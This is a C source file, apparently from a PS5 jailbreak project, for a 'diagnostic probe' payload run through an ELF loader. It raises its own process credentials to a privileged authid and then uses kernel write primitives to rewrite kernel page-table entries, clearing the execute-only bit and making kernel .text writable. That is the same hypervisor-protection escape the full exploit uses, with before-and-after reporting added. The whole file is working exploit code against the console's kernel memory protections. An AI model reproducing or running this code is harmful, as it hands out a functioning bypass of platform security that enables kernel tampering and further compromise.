/*
 * pl5-escape-probe.c -- minimal diagnostic payload for the high-FW escape.
 *
 * Does exactly one thing: reports the .text leaf pde/pte bits, runs the same
 * XOTEXT/RW clear the 13.xx vector uses, then reports the bits again. It never
 * enters rest mode, so it can be launched any time via the elfldr (e.g. over
 * its HTTP interface, which also returns the stdout) to answer the question
 * "does the escape actually clear XOTEXT on kernel .text?".
 *
 * Build (same SDK as the payload):
 *   $CC $CFLAGS -Iinclude -Iinclude/core -Iinclude/byepervisor -Iinclude/offsets \
 *       source/core/utils.c source/byepervisor/kdlsym.c source/byepervisor/paging.c \
 *       source/manifest/manifest.c source/offsets/off_*.c tools/pl5-escape-probe.c \
 *       -o bin/pl5-escape-probe.elf
 */
#include "utils.h"

#include <ps5/kernel.h>
#include <stdint.h>
#include <unistd.h>

#include "byepervisor/kdlsym.h"
#include "byepervisor/paging.h"

/* Same loop as hv_defeat_13xx.c: clear XOTEXT and set RW for ktext..kdata. */
static void escape_kernel_text(uint64_t kernel_pmap, int *pde_hits,
                               int *pte_hits) {
  uint64_t entry_addr, entry;
  *pde_hits = 0;
  *pte_hits = 0;

  for (uint64_t addr = ktext; addr < kdata; addr += 0x1000) {
    entry_addr = find_pde(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
      (*pde_hits)++;
    }

    entry_addr = find_pte(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
      (*pte_hits)++;
    }
  }
}

static void show(const char *tag, uint64_t pmap) {
  uint64_t e, a;
  a = find_pde(pmap, ktext, &e);
  notify("probe: %s pde @%#lx=%#lx xotext=%lu rw=%lu ps=%lu\n", tag,
         (unsigned long)a, (unsigned long)e,
         (unsigned long)PDE_FIELD(e, XOTEXT), (unsigned long)PDE_FIELD(e, RW),
         (unsigned long)PDE_FIELD(e, PS));
  a = find_pte(pmap, ktext, &e);
  notify("probe: %s pte @%#lx=%#lx xotext=%lu rw=%lu\n", tag, (unsigned long)a,
         (unsigned long)e, (unsigned long)PDE_FIELD(e, XOTEXT),
         (unsigned long)PDE_FIELD(e, RW));
}

int main(void) {
  uint64_t kernel_pmap, proc_pmap;
  int pde_hits = 0, pte_hits = 0;

  if (set_offsets()) {
    notify("probe: set_offsets failed (unsupported fw)\n");
    return 1;
  }
  if (init_global_vars()) {
    notify("probe: init_global_vars failed\n");
    return 1;
  }
  notify("probe: fw=%04x ktext=%#lx kdata=%#lx cr3=%#lx dmap=%#lx\n", fw,
         (unsigned long)ktext, (unsigned long)kdata, (unsigned long)cr3,
         (unsigned long)dmap);

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);

  kernel_pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  proc_pmap = get_proc_pmap();
  notify("probe: kernel_pmap=%#lx proc_pmap=%#lx\n", (unsigned long)kernel_pmap,
         (unsigned long)proc_pmap);

  show("BEFORE", kernel_pmap);
  escape_kernel_text(kernel_pmap, &pde_hits, &pte_hits);
  notify("probe: escape done pde_hits=%d pte_hits=%d\n", pde_hits, pte_hits);
  show("AFTER ", kernel_pmap);
  show("PROC  ", proc_pmap);

  notify("probe: done (no rest mode entered)\n");
  return 0;
}
